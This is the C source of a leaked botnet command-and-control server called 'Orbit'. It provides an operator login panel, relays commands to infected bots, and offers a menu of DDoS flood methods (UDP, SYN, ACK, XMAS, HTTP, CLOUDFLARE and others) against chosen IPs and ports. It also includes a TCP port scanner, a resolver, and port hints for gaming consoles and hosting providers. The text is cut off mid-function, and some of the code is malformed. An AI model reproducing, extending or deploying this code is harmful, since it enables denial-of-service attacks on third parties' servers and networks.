/*
         ██████╗ ██████╗ ██████╗ ██╗████████╗
        ██╔═══██╗██╔══██╗██╔══██╗██║╚══██╔══╝
        ██║   ██║██████╔╝██████╔╝██║   ██║   
        ██║   ██║██╔══██╗██╔══██╗██║   ██║   
        ╚██████╔╝██║  ██║██████╔╝██║   ██║   
         ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝   ╚═╝ 
               Leaked by Vlog_Hybrid #2017  
*/

#include <stdio.h>																																																																																										//bWFkZSBieSB4eHg=
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>

//including the resolver duh
#include "resolver.h"

#define MAXFDS 1000000

int adminstatus;

struct login_info {
	char username[100];
	char password[100];
};
static struct login_info accounts[100];
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
    int adminstatus;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
}}}}}}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("orbit.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void client_addr(struct sockaddr_in addr){
        printf("IP:%d.%d.%d.%d\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("logfiles/ip.log", "a");
        fprintf(logFile, "\nIP:%d.%d.%d.%d ",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}

void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char xxx[2048];
	memset(xxx, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("orbit.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}	
	
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
		char user [5000];	
		
        sprintf(user, "\x1b[38;5;202mName:\x1b[97m ");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [5000];
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, "\x1b[38;5;202mPasscode:\x1b[30m ", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
		
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);

		char yes1 [500];
		
		sprintf(yes1,  "\x1b[97mLoading orbit...\r\n", accounts[find_line].username);
	
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, yes1, strlen(yes1), MSG_NOSIGNAL) == -1) goto end;
		sleep (1);
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		
        goto Banner;
        }
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; Devices: %d %c", '\033', BotsConnected(), '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}		
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		char instagram_10gbps1   [999];
		char instagram_10gbps2   [999];
		char instagram_10gbps3   [999];
		char instagram_10gbps4   [999];
		char instagram_10gbps5   [999];
		char instagram_10gbps6   [999];

sprintf(instagram_10gbps1,   "\x1b[97m\r\n");
sprintf(instagram_10gbps2,   "\x1b[97m                         \x1b[97mBeyond the \x1b[95mgalaxy\x1b[97m and further\r\n");
sprintf(instagram_10gbps3,   "\x1b[97m                             \x1b[97mHigher than \x1b[36musually\r\n");
sprintf(instagram_10gbps4,   "\x1b[97m                             \x1b[96mInfinity\x1b[97m never ends\r\n");
sprintf(instagram_10gbps5,   "\x1b[97m                   Stars don’t \x1b[93mshine\x1b[97m bright without \x1b[1;90mdarkness\r\n");
sprintf(instagram_10gbps6,   "\x1b[97m\r\n");

  if(send(datafd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, instagram_10gbps1, strlen(instagram_10gbps1), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, instagram_10gbps2, strlen(instagram_10gbps2), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, instagram_10gbps3, strlen(instagram_10gbps3), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, instagram_10gbps4, strlen(instagram_10gbps4), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, instagram_10gbps5, strlen(instagram_10gbps5), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, instagram_10gbps6, strlen(instagram_10gbps6), MSG_NOSIGNAL) == -1) goto end;

		while(1) {
		char input [5000];
        sprintf(input, "\x1b[38;5;202m%s\x1b[97m@\x1b[38;5;202morbit\x1b[97m: \x1b[97m", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;
		
        while(fdgets(buf, sizeof buf, datafd) > 0)
        {
        if(strstr(buf, "BOTS") || strstr(buf, "bots") || strstr(buf, "count") || strstr(buf, "COUNT"))
        {  
        sprintf(xxx, " \x1b[38;5;202mBots Connected: \x1b[97m%d \x1b[38;5;202mPeople Online: \x1b[97m%d\r\n\x1b[38;5;202m Duplicated Bots: \x1b[97m%d\r\n", BotsConnected(), OperatorsConnected, TELFound, scannerreport);
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "ABOUT") || strstr(buf, "about"))
        {  
        sprintf(xxx, " \x1b[38;5;202mCreated by \x1b[97mXXX#0304\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }    
        if(strstr(buf, "PORTS") || strstr(buf, "ports"))
        {
        sprintf(xxx, " \x1b[38;5;202mHome:\x1b[97m 80 / 53 / 22 / 8080\r\n \x1b[38;5;202mXbox:\x1b[97m 3074\r\n \x1b[38;5;202mPlaystation:\x1b[97m 9307\r\n \x1b[38;5;202mNFO:\x1b[97m 1192 / Port Given\r\n \x1b[38;5;202mOVH:\x1b[97m 1192 / 443 / Port Given\r\n \x1b[38;5;202mHTTP:\x1b[97m 80 \r\n \x1b[38;5;202mHTTPS:\x1b[97m 443\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }   
        if(strstr(buf, "RULES") || strstr(buf, "rules"))
        {  
        sprintf(xxx, " \x1b[38;5;202mPlease Read The Following Rules!\r\n Not Following them will result in a ban or blacklist.\r\n \x1b[97m1.) Don't share your spot!\r\n 2.) Do not spam the net!\r\n 3.) Don't hit any goverment websites.\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "SYN"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A TCP SYN FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "RST"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A TCP RST FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "FIN"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A TCP FIN FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "ACK"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A TCP ACK FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "PSH"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A TCP PSH FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* XMAS"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A XMAS FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* DOMINATE"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A DOMINATE FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* UDP"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A UDP FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* HTTP"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A HTTP FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* CLOUDFLARE"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A HTTP CLOUDFLARE FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* CNC"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A CNC FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* JUNK"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A JUNK FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* STD"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A STD FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* HOLD"))
        {  
        sprintf(xxx, " \x1b[97mSuccesfully Sent A HOLD FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* STOMP"))
        {
        sprintf(xxx, " \x1b[97mSuccesfully Sent A STOMP FLOOD\r\n");
        if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
        }
        if (strstr(buf, "resolve") || strstr(buf, "RESOLVE")) { // resolver
        	pthread_create(&title, NULL, &TitleWriter, sock);
        	char *ip[100];
      		char *token = strtok(buf, " ");
      		char *url = token+sizeof(token);
      		trim(url);
      		resolve(url, ip);
      		sprintf(xxx, " \x1b[97mResolved \x1b[38;5;202m%s \x1b[97mto \x1b[38;5;202m%s\r\n",url, ip);
      		if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
      	}

      	if(strstr(buf, "SCAN ") || strstr(buf, "scan ")) //portscan
        {
            int x;
            int ps_timeout = 1; // usually set this as 2 or 3 but 1 is faster
            int least_port = 1;
            int max_port = 1200;
            char host[16];
            trim(buf);
            char *token = strtok(buf, " ");
            snprintf(host, sizeof(host), "%s", token+strlen(token)+1);
            snprintf(xxx, sizeof(xxx), "\x1b[97m[\x1b[38;5;202mPortscanner\x1b[97m] \x1b[38;5;202mChecking ports \x1b[97m%d-%d \x1b[38;5;202mon -> \x1b[97m%s...\x1b[38;5;202m\r\n", least_port, max_port, host);																													//bWFkZSBieSB4eHg=bWFkZSBieSB4eHg=
            if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
            for(x=least_port; x < max_port; x++)
            {
                int Sock = -1;
                struct timeval timeout;
                struct sockaddr_in sock;
                // set timeout secs
                timeout.tv_sec = ps_timeout;
                timeout.tv_usec = 0;
                Sock = socket(AF_INET, SOCK_STREAM, 0); // create our tcp socket
                setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
                setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
                sock.sin_family = AF_INET;
                sock.sin_port = htons(x);
                sock.sin_addr.s_addr = inet_addr(host);
                if(connect(Sock, (struct sockaddr *)&sock, sizeof(sock)) == -1) close(Sock);
                else
                {
                    snprintf(xxx, sizeof(xxx), "\x1b[97m[\x1b[38;5;202mPortscanner\x1b[97m]\x1b[38;5;202m %d \x1b[97mis open on \x1b[38;5;202m%s!\x1b[97m\r\n", x, host);
                    if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
                    memset(xxx, 0, sizeof(xxx));
                    close(Sock);
                }
            }
            snprintf(xxx, sizeof(xxx), "\x1b[97m[\x1b[38;5;202mPortscanner\x1b[97m] \x1b[97mScan on \x1b[38;5;202m%s \x1b[97mfinished.\x1b[97m\r\n", host);
            if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
            sleep(3);
        }

		if(strstr(buf, "HELP") || strstr(buf, "help")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
                char helpxlinex1  [999];
                char helpxlinex2  [999];
                char helpxlinex3  [999];
                char helpxlinex4  [999];
                char helpxlinex5  [999];
                char helpxlinex6  [999];

                sprintf(helpxlinex1,  "\x1b[38;5;202mType An Option:\r\n");
                sprintf(helpxlinex2,  "\x1b[38;5;202m[\x1b[97mMETHODS\x1b[38;5;202m]\x1b[97m ~ Shows all methods for DDoS Attacks\r\n");
                sprintf(helpxlinex3,  "\x1b[38;5;202m[\x1b[97mTOOLS\x1b[38;5;202m]\x1b[97m ~ Shows a list of all tools\r\n");
                sprintf(helpxlinex4,  "\x1b[38;5;202m[\x1b[97mEXTRA\x1b[38;5;202m]\x1b[97m ~ Shows a list of all extra commands\r\n");
                sprintf(helpxlinex5,  "\x1b[38;5;202m[\x1b[97mRULES\x1b[38;5;202m]\x1b[97m ~ Shows a list of all rules\r\n");
                sprintf(helpxlinex6,  "\x1b[38;5;202m%s\x1b[97m@\x1b[38;5;202morbit\x1b[97m: \x1b[97m", accounts[find_line].username);

                if(send(datafd, helpxlinex1,  strlen(helpxlinex1),   MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, helpxlinex2,  strlen(helpxlinex2),   MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, helpxlinex3,  strlen(helpxlinex3),   MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, helpxlinex4,  strlen(helpxlinex4),   MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, helpxlinex5,  strlen(helpxlinex5),   MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &TitleWriter, sock);
                while(1) {
                if(send(datafd, helpxlinex6,  strlen(helpxlinex6),   MSG_NOSIGNAL) == -1) goto end;
                break;
				}
				continue;
		}
				if(strstr(buf, "METHODS") || strstr(buf, "methods") || strstr(buf, "METHOD") || strstr(buf, "method") || strstr(buf, "?")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char xmethodsx1  [999];
                char xmethodsx2  [999];
                char xmethodsx3  [999];
                char xmethodsx4  [999];
                char xmethodsx5  [999];
                char xmethodsx6  [999];
                char xmethodsx7  [999];
                char xmethodsx8  [999];
                char xmethodsx9  [999];
                char xmethodsx10 [999];
                char xmethodsx11 [999];
                char xmethodsx12 [999];
                char xmethodsx13 [999];
                char commandmethods [80];

                sprintf(xmethodsx1,  "\x1b[38;5;202m              Orbit's Attack Menu\r\n");
                sprintf(xmethodsx2,  "\x1b[97m !* UDP [IP] [PORT] [TIME] 32 1024 10\r\n");
                sprintf(xmethodsx3,  "\x1b[97m !* TCP [IP] [PORT] [TIME] ALL 1024 1 32\r\n");
                sprintf(xmethodsx4,  "\x1b[97m !* DOMINATE [IP] [PORT] [TIME] 10\r\n");
                sprintf(xmethodsx5,  "\x1b[97m !* XMAS [IP] [PORT] [TIME] 32 1024 10\r\n");
                sprintf(xmethodsx6,  "\x1b[97m !* STD [IP] [PORT] [TIME]\r\n");
                sprintf(xmethodsx7,  "\x1b[97m !* JUNK [IP] [PORT] [TIME]\r\n");
                sprintf(xmethodsx8,  "\x1b[97m !* HOLD [IP] [PORT] [TIME]\r\n");
                sprintf(xmethodsx9,  "\x1b[97m !* CNC [IP] [PORT] [TIME]\r\n");
                sprintf(xmethodsx10, "\x1b[97m !* STOMP [IP] [PORT] [TIME] 32 ALL 1024 10\r\n");
                sprintf(xmethodsx11, "\x1b[97m !* HTTP [METHOD] [IP] [PORT] / [TIME] [POWER]\r\n");
                sprintf(xmethodsx12, "\x1b[97m !* CLOUDFLARE [METHOD] [IP] [PORT] / [TIME] [POWER]\r\n");
                sprintf(xmethodsx13, "\x1b[97m !* STOP\r\n");
                sprintf(commandmethods, "\x1b[38;5;202m%s\x1b[97m@\x1b[38;5;202morbit\x1b[97m: \x1b[97m", accounts[find_line].username);

                if(send(datafd, xmethodsx1,   strlen(xmethodsx1),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xmethodsx2,   strlen(xmethodsx2),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xmethodsx3,   strlen(xmethodsx3),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xmethodsx4,   strlen(xmethodsx4),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xmethodsx5,   strlen(xmethodsx5),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xmethodsx6,   strlen(xmethodsx6),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xmethodsx7,   strlen(xmethodsx7),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xmethodsx8,   strlen(xmethodsx8),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xmethodsx9,   strlen(xmethodsx9),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xmethodsx10,  strlen(xmethodsx10),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xmethodsx11,  strlen(xmethodsx11),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xmethodsx12,  strlen(xmethodsx12),    MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xmethodsx13,  strlen(xmethodsx13),    MSG_NOSIGNAL) == -1) goto end;
				while(1) {
				if(send(datafd, commandmethods, strlen(commandmethods), MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &TitleWriter, sock);
				break;
				}
				continue;
			}
			if(strstr(buf, "TOOLS") || strstr(buf, "tools") || strstr(buf, "MORE") || strstr(buf, "more")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char tools1  [80];
				char tools2  [80];
				char commandtools  [80];

                sprintf(tools1,  "\x1b[97m resolve (website.com)\r\n");
                sprintf(tools2,  "\x1b[97m scan (target)\r\n");

				if(send(datafd, tools1,  strlen(tools1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, tools2,  strlen(tools2),	MSG_NOSIGNAL) == -1) goto end;
				sprintf(commandtools, "\x1b[38;5;202m%s\x1b[97m@\x1b[38;5;202morbit\x1b[97m: \x1b[97m", accounts[find_line].username);
				pthread_create(&title, NULL, &TitleWriter, sock);

				while(1) {
				if(send(datafd, commandtools, strlen(commandtools), MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &TitleWriter, sock);
				break;
				}
				continue;
			}
            if(strstr(buf, "EXTRA") || strstr(buf, "extra") || strstr(buf, "SERVER") || strstr(buf, "server")) {
                pthread_create(&title, NULL, &TitleWriter, sock);
                char xextraxlinex1   [80];
                char xextraxlinex2   [80];
                char xextraxlinex3   [80];
                char xextraxlinex4   [80];
                char xextraxlinex5   [80];
                char commandextra   [80];

                sprintf(xextraxlinex1,   "\x1b[97m PORTS  \r\n");
                sprintf(xextraxlinex2,   "\x1b[97m BOTS   \r\n");
                sprintf(xextraxlinex3,   "\x1b[97m CLEAR  \r\n");
                sprintf(xextraxlinex4,   "\x1b[97m RULES  \r\n");
                sprintf(xextraxlinex5,   "\x1b[97m ABOUT  \r\n");
                sprintf(commandextra, "\x1b[38;5;202m%s\x1b[97m@\x1b[38;5;202morbit\x1b[97m: \x1b[97m", accounts[find_line].username);

                if(send(datafd, xextraxlinex1,  strlen(xextraxlinex1), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xextraxlinex2,  strlen(xextraxlinex2), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xextraxlinex3,  strlen(xextraxlinex3), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xextraxlinex4,  strlen(xextraxlinex4), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, xextraxlinex5,  strlen(xextraxlinex5), MSG_NOSIGNAL) == -1) goto end;
                sprintf(commandextra, "\x1b[38;5;202m%s\x1b[97m@\x1b[38;5;202morbit\x1b[97m: \x1b[97m", accounts[find_line].username);
                pthread_create(&title, NULL, &TitleWriter, sock);
                while(1) {
                if(send(datafd, commandextra, strlen(commandextra), MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &TitleWriter, sock);
                break;
				}
				continue;
			}
            if(strstr(buf, "!* whyurkillingthebotsbruh")) {
                char gtfomynet [2048];
                memset(gtfomynet, 0, 2048);
                sprintf(gtfomynet, "!* whyurkillingthebotsbruh\r\n");
                broadcast(buf, datafd, gtfomynet);
                continue;
            }
            if(strstr(buf, "STOP") || strstr(buf, "stop"))
            {
                char killattack [2048];
                memset(killattack, 0, 2048);
                char killattack_msg [2048];
                
                sprintf(killattack, " \x1b[97msuccessfully stopped attack!\r\n");
                broadcast(killattack, datafd, "output.");
                if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
                while(1) {
        char input [5000];
        sprintf(input, "\x1b[38;5;202m%s\x1b[97m@\x1b[38;5;202morbit\x1b[97m: \x1b[97m", accounts[find_line].username);
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
            }
	    if(strstr(buf, "CLEAR") || strstr (buf, "clear") || strstr(buf, "cls") || strstr(buf, "CLS"))
	    {
        goto Banner;
        managements[datafd].connected = 1;
     	}
        if(strstr(buf, "LOGOUT") || strstr(buf, "logout") || strstr(buf, "EXIT") || strstr(buf, "exit") || strstr(buf, "@")) 
	    {  
 		  sprintf(xxx, " Logging out %s!", accounts[find_line].username, buf);
		  if(send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) return;
		  sleep(3);
		  goto end;
		}
		if(strstr(buf, "3601")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
